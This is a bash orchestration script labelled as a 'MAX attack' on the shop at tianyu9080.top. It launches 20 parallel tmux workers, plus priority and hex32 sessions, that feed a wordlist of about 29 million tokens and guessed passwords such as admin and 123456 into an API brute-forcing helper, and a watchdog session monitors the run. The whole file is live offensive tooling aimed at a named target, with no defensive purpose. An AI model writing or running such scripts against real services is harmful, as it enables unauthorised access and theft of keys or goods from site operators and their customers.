#!/bin/bash
# tianyu9080.top MAX attack — 20x60 DIRECT
set -euo pipefail

OUT=/data/automation/results/tianyu9080.top/kami_attack_20260718
BIN=/data/automation/bin
WL=/data/wordlists/faka/faka-tokens.txt
PRI=/data/wordlists/faka/tianyu9080-priority.txt
HEX=/data/wordlists/faka/tianyu9080-hex32-sample.txt
TOTAL=29452734
WORKERS=20
THREADS="${THREADS:-60}"
PRI_THREADS="${PRI_THREADS:-80}"
CHUNK=$((TOTAL / WORKERS))

export FFFZZ_TURBO=1
export FAKA_DIRECT=1
export FFFZZ_TIMEOUT=3
export FAKA_FAST_KEY=1
export FAKA_BATCH=8000
export FAKA_BASE="https://tianyu9080.top/shop/"
export FAKA_OUT="$OUT"
export FAKA_QUICK="tianyu,tianyu9080,TIANYU9080,天鱼,ty9080,admin,123456,api,test,secret,fffzz,kln166"

mkdir -p "$OUT" "$BIN" /data/wordlists/faka
python3 "$BIN/tianyu9080_dict_gen.py" "$PRI"
python3 "$BIN/tianyu9080_hex_dict_gen.py" "$HEX"

for s in $(tmux ls 2>/dev/null | grep -E '^(kln-|ty-)' | cut -d: -f1); do
  tmux kill-session -t "$s" 2>/dev/null || true
done

for w in $(seq 0 $((WORKERS - 1))); do
  START=$((w * CHUNK))
  tmux new-session -d -s "ty-api-$w" \
    "FAKA_BASE=$FAKA_BASE FAKA_OUT=$OUT FAKA_DIRECT=1 FAKA_QUICK=$FAKA_QUICK FFFZZ_TURBO=1 FFFZZ_TIMEOUT=3 FAKA_FAST_KEY=1 FAKA_BATCH=8000 python3 $BIN/faka_api_brute_fast.py $WL $START $CHUNK $THREADS $w $OUT 2>&1 | tee -a $OUT/api_w${w}.log"
  sleep 0.1
done

tmux new-session -d -s ty-priority \
  "FAKA_BASE=$FAKA_BASE FAKA_OUT=$OUT FAKA_DIRECT=1 FAKA_QUICK=$FAKA_QUICK FFFZZ_TURBO=1 FFFZZ_TIMEOUT=3 FAKA_FAST_KEY=1 FAKA_BATCH=8000 python3 $BIN/faka_api_brute_fast.py $PRI 0 0 $PRI_THREADS 99 $OUT 2>&1 | tee -a $OUT/priority.log"

tmux new-session -d -s ty-hex32 \
  "FAKA_BASE=$FAKA_BASE FAKA_OUT=$OUT FAKA_DIRECT=1 FAKA_QUICK=$FAKA_QUICK FFFZZ_TURBO=1 FFFZZ_TIMEOUT=3 FAKA_FAST_KEY=1 FAKA_BATCH=8000 python3 $BIN/faka_api_brute_fast.py $HEX 0 0 $PRI_THREADS 98 $OUT 2>&1 | tee -a $OUT/hex32.log"

tmux new-session -d -s ty-watch "WORKERS=$WORKERS THREADS=$THREADS FAKA_BASE=$FAKA_BASE bash $BIN/tianyu9080_watchdog.sh"

echo "TIANYU9080 MAX: ${WORKERS}x${THREADS} DIRECT | base=$FAKA_BASE"
tmux ls | grep ty-
